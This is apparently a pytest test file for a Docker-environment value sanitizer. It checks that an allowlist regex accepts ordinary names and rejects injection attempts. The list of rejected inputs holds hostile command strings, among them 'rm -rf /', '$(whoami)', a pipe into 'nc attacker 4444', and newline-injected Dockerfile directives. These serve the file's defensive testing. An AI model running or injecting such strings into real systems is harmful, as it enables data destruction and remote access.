"""Sanitizer fuzz + happy-path tests for ``docker_control.sanitize``.

The allowlist is ``^[A-Za-z0-9_\\-.@:/]+$`` — every test here pins one
explicit input/output relationship so a future "let's relax the regex
a bit" refactor immediately tells us which downstream contract breaks.
"""

from __future__ import annotations

import pytest
from aether_api.docker_control.sanitize import (
    UnsafeValueError,
    is_safe,
    sanitize_env_value,
    sanitize_optional,
)

# Pure-function tests: no DB, no settings. Mark as a release_gate so
# the sanitizer never quietly weakens.
pytestmark = pytest.mark.release_gate


# ---------------------------------------------------------------------------
# Positive — values that MUST pass.
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "value",
    [
        "EURUSD",
        "ICMarkets",
        "demo-12345",
        "broker.example.com",
        "mt5-base:latest",
        "registry/repo:tag",
        "user@host",
        "ALL_CAPS_OK",
        "a",
        "1",
    ],
)
def test_safe_values_pass(value: str) -> None:
    assert is_safe(value) is True
    assert sanitize_env_value(value, field="x") == value


# ---------------------------------------------------------------------------
# Negative — every dangerous payload class. None of these may pass.
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "value",
    [
        "",                                  # empty rejected by ``+`` quantifier
        " ",                                 # space allows token-splitting
        "a b",                               # internal space → second directive
        "name\nRUN echo pwned",              # newline → directive injection
        "name\r\nLABEL key=value",           # CRLF
        "broker;rm -rf /",                   # shell metachar
        "$(whoami)",                         # command substitution
        "`whoami`",                          # backtick command substitution
        "name|nc attacker 4444",             # pipe
        "name&background",                   # background
        "name>out",                          # redirection
        "name<in",                           # redirection in
        "name\"with quotes",                 # double quote
        "name'with quotes",                  # single quote
        "name#comment",                      # # not in allowlist
        "name?param=1",                      # ? not in allowlist
        "name=value",                        # = not in allowlist
        "name{json}",                        # braces
        "name[idx]",                         # brackets
        "name\\backslash",                   # backslash
        "name+plus",                         # + not in allowlist
        "name%encoded",                      # % not in allowlist
    ],
)
def test_unsafe_values_rejected(value: str) -> None:
    assert is_safe(value) is False
    with pytest.raises(UnsafeValueError) as exc:
        sanitize_env_value(value, field="broker_name")
    assert exc.value.field == "broker_name"


def test_unsafe_value_truncates_long_payload_in_message() -> None:
    """A multi-KB payload must not blow up the error message."""
    payload = "?" * 4096
    with pytest.raises(UnsafeValueError) as exc:
        sanitize_env_value(payload, field="x")
    # The stored value is truncated to 80 chars; the regex hint is appended.
    assert len(exc.value.value) <= 80


def test_sanitize_optional_returns_none_for_none() -> None:
    assert sanitize_optional(None, field="x") is None


def test_sanitize_optional_validates_when_present() -> None:
    assert sanitize_optional("ok-1", field="x") == "ok-1"
    with pytest.raises(UnsafeValueError):
        sanitize_optional("not ok", field="x")


def test_non_string_inputs_are_not_safe() -> None:
    assert is_safe(123) is False  # type: ignore[arg-type]
    assert is_safe(None) is False  # type: ignore[arg-type]
